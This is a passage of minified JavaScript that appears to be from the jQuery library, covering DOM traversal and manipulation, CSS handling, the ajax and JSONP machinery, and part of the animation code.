a=="string"?f(a,b):f.makeArray(a&&a.nodeType?[a]:a),d=f.merge(this.get(),c);return this.pushStack(W(c[0])||W(d[0])?d:f.unique(d))},andSelf:function(){return this.add(this.prevObject)}}),f.each({parent:function(a){var b=a.parentNode;return b&&b.nodeType!==11?b:null},parents:function(a){return f.dir(a,"parentNode")},parentsUntil:function(a,b,c){return f.dir(a,"parentNode",c)},next:function(a){return f.nth(a,2,"nextSibling")},prev:function(a){return f.nth(a,2,"previousSibling")},nextAll:function(a){return f.dir(a,"nextSibling")},prevAll:function(a){return f.dir(a,"previousSibling")},nextUntil:function(a,b,c){return f.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return f.dir(a,"previousSibling",c)},siblings:function(a){return f.sibling(a.parentNode.firstChild,a)},children:function(a){return f.sibling(a.firstChild)},contents:function(a){return f.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:f.makeArray(a.childNodes)}},function(a,b){f.fn[a]=function(c,d){var e=f.map(this,b,c),g=T.call(arguments);P.test(a)||(d=c),d&&typeof d=="string"&&(e=f.filter(d,e)),e=this.length>1&&!V[a]?f.unique(e):e,(this.length>1||R.test(d))&&Q.test(a)&&(e=e.reverse());return this.pushStack(e,a,g.join(","))}}),f.extend({filter:function(a,b,c){c&&(a=":not("+a+")");return b.length===1?f.find.matchesSelector(b[0],a)?[b[0]]:[]:f.find.matches(a,b)},dir:function(a,c,d){var e=[],g=a[c];while(g&&g.nodeType!==9&&(d===b||g.nodeType!==1||!f(g).is(d)))g.nodeType===1&&e.push(g),g=g[c];return e},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c])if(a.nodeType===1&&++e===b)break;return a},sibling:function(a,b){var c=[];for(;a;a=a.nextSibling)a.nodeType===1&&a!==b&&c.push(a);return c}});var Y=/ jQuery\d+="(?:\d+|null)"/g,Z=/^\s+/,$=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,_=/<([\w:]+)/,ba=/<tbody/i,bb=/<|&#?\w+;/,bc=/<(?:script|object|embed|option|style)/i,bd=/checked\s*(?:[^=]|=\s*.checked.)/i,be=/\/(java|ecma)script/i,bf=/^\s*<!(?:\[CDATA\[|\-\-)/,bg={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]};bg.optgroup=bg.option,bg.tbody=bg.tfoot=bg.colgroup=bg.caption=bg.thead,bg.th=bg.td,f.support.htmlSerialize||(bg._default=[1,"div<div>","</div>"]),f.fn.extend({text:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.text(a.call(this,b,c.text()))});if(typeof a!="object"&&a!==b)return this.empty().append((this[0]&&this[0].ownerDocument||c).createTextNode(a));return f.text(this)},wrapAll:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapAll(a.call(this,b))});if(this[0]){var b=f(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&a.firstChild.nodeType===1)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapInner(a.call(this,b))});return this.each(function(){var b=f(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){return this.each(function(){f(this).wrapAll(a)})},unwrap:function(){return this.parent().each(function(){f.nodeName(this,"body")||f(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});if(arguments.length){var a=f(arguments[0]);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,f(arguments[0]).toArray());return a}},remove:function(a,b){for(var c=0,d;(d=this[c])!=null;c++)if(!a||f.filter(a,[d]).length)!b&&d.nodeType===1&&(f.cleanData(d.getElementsByTagName("*")),f.cleanData([d])),d.parentNode&&d.parentNode.removeChild(d);return this},empty:function(){for(var a=0,b;(b=this[a])!=null;a++){b.nodeType===1&&f.cleanData(b.getElementsByTagName("*"));while(b.firstChild)b.removeChild(b.firstChild)}return this},clone:function(a,b){a=a==null?!1:a,b=b==null?a:b;return this.map(function(){return f.clone(this,a,b)})},html:function(a){if(a===b)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(Y,""):null;if(typeof a=="string"&&!bc.test(a)&&(f.support.leadingWhitespace||!Z.test(a))&&!bg[(_.exec(a)||["",""])[1].toLowerCase()]){a=a.replace($,"<$1></$2>");try{for(var c=0,d=this.length;c<d;c++)this[c].nodeType===1&&(f.cleanData(this[c].getElementsByTagName("*")),this[c].innerHTML=a)}catch(e){this.empty().append(a)}}else f.isFunction(a)?this.each(function(b){var c=f(this);c.html(a.call(this,b,c.html()))}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(f.isFunction(a))return this.each(function(b){var c=f(this),d=c.html();c.replaceWith(a.call(this,b,d))});typeof a!="string"&&(a=f(a).detach());return this.each(function(){var b=this.nextSibling,c=this.parentNode;f(this).remove(),b?f(b).before(a):f(c).append(a)})}return this.length?this.pushStack(f(f.isFunction(a)?a():a),"replaceWith",a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,d){var e,g,h,i,j=a[0],k=[];if(!f.support.checkClone&&arguments.length===3&&typeof j=="string"&&bd.test(j))return this.each(function(){f(this).domManip(a,c,d,!0)});if(f.isFunction(j))return this.each(function(e){var g=f(this);a[0]=j.call(this,e,c?g.html():b),g.domManip(a,c,d)});if(this[0]){i=j&&j.parentNode,f.support.parentNode&&i&&i.nodeType===11&&i.childNodes.length===this.length?e={fragment:i}:e=f.buildFragment(a,this,k),h=e.fragment,h.childNodes.length===1?g=h=h.firstChild:g=h.firstChild;if(g){c=c&&f.nodeName(g,"tr");for(var l=0,m=this.length,n=m-1;l<m;l++)d.call(c?bh(this[l],g):this[l],e.cacheable||m>1&&l<n?f.clone(h,!0,!0):h)}k.length&&f.each(k,bn)}return this}}),f.buildFragment=function(a,b,d){var e,g,h,i=b&&b[0]?b[0].ownerDocument||b[0]:c;a.length===1&&typeof a[0]=="string"&&a[0].length<512&&i===c&&a[0].charAt(0)==="<"&&!bc.test(a[0])&&(f.support.checkClone||!bd.test(a[0]))&&(g=!0,h=f.fragments[a[0]],h&&h!==1&&(e=h)),e||(e=i.createDocumentFragment(),f.clean(a,i,e,d)),g&&(f.fragments[a[0]]=h?e:1);return{fragment:e,cacheable:g}},f.fragments={},f.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){f.fn[a]=function(c){var d=[],e=f(c),g=this.length===1&&this[0].parentNode;if(g&&g.nodeType===11&&g.childNodes.length===1&&e.length===1){e[b](this[0]);return this}for(var h=0,i=e.length;h<i;h++){var j=(h>0?this.clone(!0):this).get();f(e[h])[b](j),d=d.concat(j)}return this.pushStack(d,a,e.selector)}}),f.extend({clone:function(a,b,c){var d=a.cloneNode(!0),e,g,h;if((!f.support.noCloneEvent||!f.support.noCloneChecked)&&(a.nodeType===1||a.nodeType===11)&&!f.isXMLDoc(a)){bj(a,d),e=bk(a),g=bk(d);for(h=0;e[h];++h)bj(e[h],g[h])}if(b){bi(a,d);if(c){e=bk(a),g=bk(d);for(h=0;e[h];++h)bi(e[h],g[h])}}return d},clean:function(a,b,d,e){var g;b=b||c,typeof b.createElement=="undefined"&&(b=b.ownerDocument||
b[0]&&b[0].ownerDocument||c);var h=[],i;for(var j=0,k;(k=a[j])!=null;j++){typeof k=="number"&&(k+="");if(!k)continue;if(typeof k=="string")if(!bb.test(k))k=b.createTextNode(k);else{k=k.replace($,"<$1></$2>");var l=(_.exec(k)||["",""])[1].toLowerCase(),m=bg[l]||bg._default,n=m[0],o=b.createElement("div");o.innerHTML=m[1]+k+m[2];while(n--)o=o.lastChild;if(!f.support.tbody){var p=ba.test(k),q=l==="table"&&!p?o.firstChild&&o.firstChild.childNodes:m[1]==="<table>"&&!p?o.childNodes:[];for(i=q.length-1;i>=0;--i)f.nodeName(q[i],"tbody")&&!q[i].childNodes.length&&q[i].parentNode.removeChild(q[i])}!f.support.leadingWhitespace&&Z.test(k)&&o.insertBefore(b.createTextNode(Z.exec(k)[0]),o.firstChild),k=o.childNodes}var r;if(!f.support.appendChecked)if(k[0]&&typeof (r=k.length)=="number")for(i=0;i<r;i++)bm(k[i]);else bm(k);k.nodeType?h.push(k):h=f.merge(h,k)}if(d){g=function(a){return!a.type||be.test(a.type)};for(j=0;h[j];j++)if(e&&f.nodeName(h[j],"script")&&(!h[j].type||h[j].type.toLowerCase()==="text/javascript"))e.push(h[j].parentNode?h[j].parentNode.removeChild(h[j]):h[j]);else{if(h[j].nodeType===1){var s=f.grep(h[j].getElementsByTagName("script"),g);h.splice.apply(h,[j+1,0].concat(s))}d.appendChild(h[j])}}return h},cleanData:function(a){var b,c,d=f.cache,e=f.expando,g=f.event.special,h=f.support.deleteExpando;for(var i=0,j;(j=a[i])!=null;i++){if(j.nodeName&&f.noData[j.nodeName.toLowerCase()])continue;c=j[f.expando];if(c){b=d[c]&&d[c][e];if(b&&b.events){for(var k in b.events)g[k]?f.event.remove(j,k):f.removeEvent(j,k,b.handle);b.handle&&(b.handle.elem=null)}h?delete j[f.expando]:j.removeAttribute&&j.removeAttribute(f.expando),delete d[c]}}}});var bo=/alpha\([^)]*\)/i,bp=/opacity=([^)]*)/,bq=/-([a-z])/ig,br=/([A-Z]|^ms)/g,bs=/^-?\d+(?:px)?$/i,bt=/^-?\d/,bu=/^[+\-]=/,bv=/[^+\-\.\de]+/g,bw={position:"absolute",visibility:"hidden",display:"block"},bx=["Left","Right"],by=["Top","Bottom"],bz,bA,bB,bC=function(a,b){return b.toUpperCase()};f.fn.css=function(a,c){if(arguments.length===2&&c===b)return this;return f.access(this,a,c,!0,function(a,c,d){return d!==b?f.style(a,c,d):f.css(a,c)})},f.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=bz(a,"opacity","opacity");return c===""?"1":c}return a.style.opacity}}},cssNumber:{zIndex:!0,fontWeight:!0,opacity:!0,zoom:!0,lineHeight:!0,widows:!0,orphans:!0},cssProps:{"float":f.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,c,d,e){if(!!a&&a.nodeType!==3&&a.nodeType!==8&&!!a.style){var g,h,i=f.camelCase(c),j=a.style,k=f.cssHooks[i];c=f.cssProps[i]||i;if(d===b){if(k&&"get"in k&&(g=k.get(a,!1,e))!==b)return g;return j[c]}h=typeof d;if(h==="number"&&isNaN(d)||d==null)return;h==="string"&&bu.test(d)&&(d=+d.replace(bv,"")+parseFloat(f.css(a,c))),h==="number"&&!f.cssNumber[i]&&(d+="px");if(!k||!("set"in k)||(d=k.set(a,d))!==b)try{j[c]=d}catch(l){}}},css:function(a,c,d){var e,g;c=f.camelCase(c),g=f.cssHooks[c],c=f.cssProps[c]||c,c==="cssFloat"&&(c="float");if(g&&"get"in g&&(e=g.get(a,!0,d))!==b)return e;if(bz)return bz(a,c)},swap:function(a,b,c){var d={};for(var e in b)d[e]=a.style[e],a.style[e]=b[e];c.call(a);for(e in b)a.style[e]=d[e]},camelCase:function(a){return a.replace(bq,bC)}}),f.curCSS=f.css,f.each(["height","width"],function(a,b){f.cssHooks[b]={get:function(a,c,d){var e;if(c){a.offsetWidth!==0?e=bD(a,b,d):f.swap(a,bw,function(){e=bD(a,b,d)});if(e<=0){e=bz(a,b,b),e==="0px"&&bB&&(e=bB(a,b,b));if(e!=null)return e===""||e==="auto"?"0px":e}if(e<0||e==null){e=a.style[b];return e===""||e==="auto"?"0px":e}return typeof e=="string"?e:e+"px"}},set:function(a,b){if(!bs.test(b))return b;b=parseFloat(b);if(b>=0)return b+"px"}}}),f.support.opacity||(f.cssHooks.opacity={get:function(a,b){return bp.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle;c.zoom=1;var e=f.isNaN(b)?"":"alpha(opacity="+b*100+")",g=d&&d.filter||c.filter||"";c.filter=bo.test(g)?g.replace(bo,e):g+" "+e}}),f(function(){f.support.reliableMarginRight||(f.cssHooks.marginRight={get:function(a,b){var c;f.swap(a,{display:"inline-block"},function(){b?c=bz(a,"margin-right","marginRight"):c=a.style.marginRight});return c}})}),c.defaultView&&c.defaultView.getComputedStyle&&(bA=function(a,c){var d,e,g;c=c.replace(br,"-$1").toLowerCase();if(!(e=a.ownerDocument.defaultView))return b;if(g=e.getComputedStyle(a,null))d=g.getPropertyValue(c),d===""&&!f.contains(a.ownerDocument.documentElement,a)&&(d=f.style(a,c));return d}),c.documentElement.currentStyle&&(bB=function(a,b){var c,d=a.currentStyle&&a.currentStyle[b],e=a.runtimeStyle&&a.runtimeStyle[b],f=a.style;!bs.test(d)&&bt.test(d)&&(c=f.left,e&&(a.runtimeStyle.left=a.currentStyle.left),f.left=b==="fontSize"?"1em":d||0,d=f.pixelLeft+"px",f.left=c,e&&(a.runtimeStyle.left=e));return d===""?"auto":d}),bz=bA||bB,f.expr&&f.expr.filters&&(f.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;return b===0&&c===0||!f.support.reliableHiddenOffsets&&(a.style.display||f.css(a,"display"))==="none"},f.expr.filters.visible=function(a){return!f.expr.filters.hidden(a)});var bE=/%20/g,bF=/\[\]$/,bG=/\r?\n/g,bH=/#.*$/,bI=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,bJ=/^(?:color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,bK=/^(?:about|app|app\-storage|.+\-extension|file|widget):$/,bL=/^(?:GET|HEAD)$/,bM=/^\/\//,bN=/\?/,bO=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,bP=/^(?:select|textarea)/i,bQ=/\s+/,bR=/([?&])_=[^&]*/,bS=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,bT=f.fn.load,bU={},bV={},bW,bX;try{bW=e.href}catch(bY){bW=c.createElement("a"),bW.href="",bW=bW.href}bX=bS.exec(bW.toLowerCase())||[],f.fn.extend({load:function(a,c,d){if(typeof a!="string"&&bT)return bT.apply(this,arguments);if(!this.length)return this;var e=a.indexOf(" ");if(e>=0){var g=a.slice(e,a.length);a=a.slice(0,e)}var h="GET";c&&(f.isFunction(c)?(d=c,c=b):typeof c=="object"&&(c=f.param(c,f.ajaxSettings.traditional),h="POST"));var i=this;f.ajax({url:a,type:h,dataType:"html",data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&&(a.done(function(a){c=a}),i.html(g?f("<div>").append(c.replace(bO,"")).find(g):c)),d&&i.each(d,[c,b,a])}});return this},serialize:function(){return f.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?f.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||bP.test(this.nodeName)||bJ.test(this.type))}).map(function(a,b){var c=f(this).val();return c==null?null:f.isArray(c)?f.map(c,function(a,c){return{name:b.name,value:a.replace(bG,"\r\n")}}):{name:b.name,value:c.replace(bG,"\r\n")}}).get()}}),f.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){f.fn[b]=function(a){return this.bind(b,a)}}),f.each(["get","post"],function(a,c){f[c]=function(a,d,e,g){f.isFunction(d)&&(g=g||e,e=d,d=b);return f.ajax({type:c,url:a,data:d,success:e,dataType:g})}}),f.extend({getScript:function(a,c){return f.get(a,b,c,"script")},getJSON:function(a,b,c){return f.get(a,b,c,"json")},ajaxSetup:function(a,b){b?f.extend(!0,a,f.ajaxSettings,b):(b=a,a=f.extend(!0,f.ajaxSettings,b));for(var c in{context:1,url:1})c in b?a[c]=b[c]:c in f.ajaxSettings&&(a[c]=f.ajaxSettings[c]);return a},ajaxSettings:{url:bW,isLocal:bK.test(bX[1]),global:!0,type:"GET",contentType:"application/x-www-form-urlencoded",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":"*/*"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":a.String,"text html":!0,"text json":f.parseJSON,"text xml":f.parseXML}},ajaxPrefilter:bZ(bU),ajaxTransport:bZ(bV),ajax:function(a,c){function w(a,c,l,m){if(s!==2){s=2,q&&clearTimeout(q),p=b,n=m||"",v.readyState=a?4:0;var o,r,u,w=l?ca(d,v,l):b,x,y;if(a>=200&&a<300||a===304){if(d.ifModified){if(x=v.getResponseHeader("Last-Modified"))f.lastModified[k]=x;if(y=v.getResponseHeader("Etag"))f.etag[k]=y}if(a===304)c="notmodified",o=!0;else try{r=cb(d,w),c="success",o=!0}catch(z){c="parsererror",u=z}}else{u=c;if(!c||a)c="error",a<0&&(a=0)}v.status=a,v.statusText=c,o?h.resolveWith(e,[r,c,v]):h.rejectWith(e,[v,c,u]),v.statusCode(j),j=b,t&&g.trigger("ajax"+(o?"Success":"Error"),[v,d,o?r:u]),i.resolveWith(e,[v,c]),t&&(g.trigger("ajaxComplete",[v,d]),--f.active||f.event.trigger("ajaxStop"))}}typeof a=="object"&&(c=a,a=b),c=c||{};var d=f.ajaxSetup({},c),e=d.context||d,g=e!==d&&(e.nodeType||e instanceof f)?f(e):f.event,h=f.Deferred(),i=f._Deferred(),j=d.statusCode||{},k,l={},m={},n,o,p,q,r,s=0,t,u,v={readyState:0,setRequestHeader:function(a,b){if(!s){var c=a.toLowerCase();a=m[c]=m[c]||a,l[a]=b}return this},getAllResponseHeaders:function(){return s===2?n:null},getResponseHeader:function(a){var c;if(s===2){if(!o){o={};while(c=bI.exec(n))o[c[1].toLowerCase()]=c[2]}c=o[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){s||(d.mimeType=a);return this},abort:function(a){a=a||"abort",p&&p.abort(a),w(0,a);return this}};h.promise(v),v.success=v.done,v.error=v.fail,v.complete=i.done,v.statusCode=function(a){if(a){var b;if(s<2)for(b in a)j[b]=[j[b],a[b]];else b=a[v.status],v.then(b,b)}return this},d.url=((a||d.url)+"").replace(bH,"").replace(bM,bX[1]+"//"),d.dataTypes=f.trim(d.dataType||"*").toLowerCase().split(bQ),d.crossDomain==null&&(r=bS.exec(d.url.toLowerCase()),d.crossDomain=!(!r||r[1]==bX[1]&&r[2]==bX[2]&&(r[3]||(r[1]==="http:"?80:443))==(bX[3]||(bX[1]==="http:"?80:443)))),d.data&&d.processData&&typeof d.data!="string"&&(d.data=f.param(d.data,d.traditional)),b$(bU,d,c,v);if(s===2)return!1;t=d.global,d.type=d.type.toUpperCase(),d.hasContent=!bL.test(d.type),t&&f.active++===0&&f.event.trigger("ajaxStart");if(!d.hasContent){d.data&&(d.url+=(bN.test(d.url)?"&":"?")+d.data),k=d.url;if(d.cache===!1){var x=f.now(),y=d.url.replace(bR,"$1_="+x);d.url=y+(y===d.url?(bN.test(d.url)?"&":"?")+"_="+x:"")}}(d.data&&d.hasContent&&d.contentType!==!1||c.contentType)&&v.setRequestHeader("Content-Type",d.contentType),d.ifModified&&(k=k||d.url,f.lastModified[k]&&v.setRequestHeader("If-Modified-Since",f.lastModified[k]),f.etag[k]&&v.setRequestHeader("If-None-Match",f.etag[k])),v.setRequestHeader("Accept",d.dataTypes[0]&&d.accepts[d.dataTypes[0]]?d.accepts[d.dataTypes[0]]+(d.dataTypes[0]!=="*"?", */*; q=0.01":""):d.accepts["*"]);for(u in d.headers)v.setRequestHeader(u,d.headers[u]);if(d.beforeSend&&(d.beforeSend.call(e,v,d)===!1||s===2)){v.abort();return!1}for(u in{success:1,error:1,complete:1})v[u](d[u]);p=b$(bV,d,c,v);if(!p)w(-1,"No Transport");else{v.readyState=1,t&&g.trigger("ajaxSend",[v,d]),d.async&&d.timeout>0&&(q=setTimeout(function(){v.abort("timeout")},d.timeout));try{s=1,p.send(l,w)}catch(z){status<2?w(-1,z):f.error(z)}}return v},param:function(a,c){var d=[],e=function(a,b){b=f.isFunction(b)?b():b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};c===b&&(c=f.ajaxSettings.traditional);if(f.isArray(a)||a.jquery&&!f.isPlainObject(a))f.each(a,function(){e(this.name,this.value)});else for(var g in a)b_(g,a[g],c,e);return d.join("&").replace(bE,"+")}}),f.extend({active:0,lastModified:{},etag:{}});var cc=f.now(),cd=/(\=)\?(&|$)|\?\?/i;f.ajaxSetup({jsonp:"callback",jsonpCallback:function(){return f.expando+"_"+cc++}}),f.ajaxPrefilter("json jsonp",function(b,c,d){var e=b.contentType==="application/x-www-form-urlencoded"&&typeof b.data=="string";if(b.dataTypes[0]==="jsonp"||b.jsonp!==!1&&(cd.test(b.url)||e&&cd.test(b.data))){var g,h=b.jsonpCallback=f.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,i=a[h],j=b.url,k=b.data,l="$1"+h+"$2";b.jsonp!==!1&&(j=j.replace(cd,l),b.url===j&&(e&&(k=k.replace(cd,l)),b.data===k&&(j+=(/\?/.test(j)?"&":"?")+b.jsonp+"="+h))),b.url=j,b.data=k,a[h]=function(a){g=[a]},d.always(function(){a[h]=i,g&&f.isFunction(i)&&a[h](g[0])}),b.converters["script json"]=function(){g||f.error(h+" was not called");return g[0]},b.dataTypes[0]="json";return"script"}}),f.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(a){f.globalEval(a);return a}}}),f.ajaxPrefilter("script",function(a){a.cache===b&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),f.ajaxTransport("script",function(a){if(a.crossDomain){var d,e=c.head||c.getElementsByTagName("head")[0]||c.documentElement;return{send:function(f,g){d=c.createElement("script"),d.async="async",a.scriptCharset&&(d.charset=a.scriptCharset),d.src=a.url,d.onload=d.onreadystatechange=function(a,c){if(c||!d.readyState||/loaded|complete/.test(d.readyState))d.onload=d.onreadystatechange=null,e&&d.parentNode&&e.removeChild(d),d=b,c||g(200,"success")},e.insertBefore(d,e.firstChild)},abort:function(){d&&d.onload(0,1)}}}});var ce=a.ActiveXObject?function(){for(var a in cg)cg[a](0,1)}:!1,cf=0,cg;f.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&&ch()||ci()}:ch,function(a){f.extend(f.support,{ajax:!!a,cors:!!a&&"withCredentials"in a})}(f.ajaxSettings.xhr()),f.support.ajax&&f.ajaxTransport(function(c){if(!c.crossDomain||f.support.cors){var d;return{send:function(e,g){var h=c.xhr(),i,j;c.username?h.open(c.type,c.url,c.async,c.username,c.password):h.open(c.type,c.url,c.async);if(c.xhrFields)for(j in c.xhrFields)h[j]=c.xhrFields[j];c.mimeType&&h.overrideMimeType&&h.overrideMimeType(c.mimeType),!c.crossDomain&&!e["X-Requested-With"]&&(e["X-Requested-With"]="XMLHttpRequest");try{for(j in e)h.setRequestHeader(j,e[j])}catch(k){}h.send(c.hasContent&&c.data||null),d=function(a,e){var j,k,l,m,n;try{if(d&&(e||h.readyState===4)){d=b,i&&(h.onreadystatechange=f.noop,ce&&delete cg[i]);if(e)h.readyState!==4&&h.abort();else{j=h.status,l=h.getAllResponseHeaders(),m={},n=h.responseXML,n&&n.documentElement&&(m.xml=n),m.text=h.responseText;try{k=h.statusText}catch(o){k=""}!j&&c.isLocal&&!c.crossDomain?j=m.text?200:404:j===1223&&(j=204)}}}catch(p){e||g(-1,p)}m&&g(j,k,m,l)},!c.async||h.readyState===4?d():(i=++cf,ce&&(cg||(cg={},f(a).unload(ce)),cg[i]=d),h.onreadystatechange=d)},abort:function(){d&&d(0,1)}}}});var cj={},ck,cl,cm=/^(?:toggle|show|hide)$/,cn=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,co,cp=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]],cq,cr=a.webkitRequestAnimationFrame||a.mozRequestAnimationFrame||a.oRequestAnimationFrame;f.fn.extend({show:function(a,b,c){var d,e;if(a||a===0)return this.animate(cu("show",3),a,b,c);for(var g=0,h=this.length;g<h;g++)d=this[g],d.style&&(e=d.style.display,!f._data(d,"olddisplay")&&e==="none"&&(e=d.style.display=""),e===""&&f.css(d,"display")==="none"&&f._data(d,"olddisplay",cv(d.nodeName)));for(g=0;g<h;g++){d=this[g];if(d.style){e=d.style.display;if(e===""||e==="none")d.style.display=f._data(d,"olddisplay")||""}}return this},hide:function(a,b,c){if(a||a===0)return this.animate(cu("hide",3),a,b,c);for(var d=0,e=this.length;d<e;d++)if(this[d].style){var g=f.css(this[d],"display");g!=="none"&&!f._data(this[d],"olddisplay")&&f._data(this[d],"olddisplay",g)}for(d=0;d<e;d++)this[d].style&&(this[d].style.display="none");return this},_toggle:f.fn.toggle,toggle:function(a,b,c){var d=typeof a=="boolean";f.isFunction(a)&&f.isFunction(b)?this._toggle.apply(this,arguments):a==null||d?this.each(function(){var b=d?a:f(this).is(":hidden");f(this)[b?"show":"hide"]()}):this.animate(cu("toggle",3),a,b,c);return this},fadeTo:function(a,b,c,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){var e=f.speed(b,c,d);if(f.isEmptyObject(a))return this.each(e.complete,[!1]);a=f.extend({},a);return this[e.queue===!1?"each":"queue"](function(){e.queue===!1&&f._mark(this);var b=f.extend({},e),c=this.nodeType===1,d=c&&f(this).is(":hidden"),g,h,i,j,k,l,m,n,o;b.animatedProperties={};for(i in a){g=f.camelCase(i),i!==g&&(a[g]=a[i],delete a[i]),h=a[g],f.isArray(h)?(b.animatedProperties[g]=h[1],h=a[g]=h[0]):b.animatedProperties[g]=b.specialEasing&&b.specialEasing[g]||b.easing||"swing";if(h==="hide"&&d||h==="show"&&!d)return b.complete.call(this);c&&(g==="height"||g==="width")&&(b.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY],f.css(this,"display")==="inline"&&f.css(this,"float")==="none"&&(f.support.inlineBlockNeedsLayout?(j=cv(this.nodeName),j==="inline"?this.style.display="inline-block":(this.style.display="inline",this.style.zoom=1)):this.style.display="inline-block"))}b.overflow!=null&&(this.style.overflow="hidden");for(i in a)k=new f.fx(this,b,i),h=a[i],cm.test(h)?k[h==="toggle"?d?"show":"hide":h]():(l=cn.exec(h),m=k.cur(),l?(n=parseFloat(l[2]),o=l[3]||(f.cssNumber[i]?"":"px"),o!=="px"&&(f.style(this,i,(n||1)+o),m=(n||1)/k.cur()*m,f.style(this,i,m+o)),l[1]&&(n=(l[1]==="-="?-1:1)*n+m),k.custom(m,n,o)):k.custom(m,h,""));return!0})},stop:function(a,b){a&&this.queue([]),this.each(function(){var a=f.timers,c=a.length;b||f._unmark(!0,this);while(c--)a[c].elem===this&&(b&&a[c](!0),a.splice(c,1))}),b||this.dequeue();return this}}),f.each({slideDown:cu("show",1),slideUp:cu("hide",1),slideToggle:cu("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){f.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),f.extend({speed:function(a,b,c){var d=a&&typeof a=="object"?f.extend({},a):{complete:c||!c&&b||f.isFunction(a)&&a,duration:a,easing:c&&b||b&&!f.isFunction(b)&&b};d.duration=f.fx.off?0:typeof d.duration=="number"?d.duration:d.duration in f.fx.speeds?f.fx.speeds[d.duration]:f.fx.speeds._default,d.old=d.complete,d.complete=function(a){d.queue!==!1?f.dequeue(this):a!==!1&&f._unmark(this),f.isFunction(d.old)&&d.old.call(this)};return d},easing:{linear:function(a,b,c,d){return c+d*a},swing:function(a,b,c,d){return(-Math.cos(a*Math.PI)/2+.5)*d+c}},timers:[],fx:function(a,b,c){this.options=b,this.elem=a,this.prop=c,b.orig=b.orig||{}}}),f.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this),(f.fx.step[this.prop]||f.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a,b=f.css(this.elem,this.prop);return isNaN(a=parseFloat(b))?!b||b==="auto"?0:b:a},custom:function(a,b,c){function h(a){return d.step(a)}var d=this,e=f.fx,g;this.startTime=cq||cs(),this.start=a,this.end=b,this.unit=c||this.unit||(f.cssNumber[this.prop]?"":"px"),this.now=this.start,this.pos=this.state=0,h.elem=this.elem,h()&&f.timers.push(h)&&!co&&(cr?(co=1,g=function(){co&&(cr(g),e.tick())},cr(g)):co=setInterval(e.tick,e.interval))},show:function(){this.options.orig[this.prop]=f.style(this.elem,this.prop),this.options.show=!0,this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur()),f(this.elem).show()},hide:function(){this.options.orig[this.prop]=f.style(this.elem,this.prop),this.options.hide=!0,this.custom(this.cur(),0)},step:function(a){var 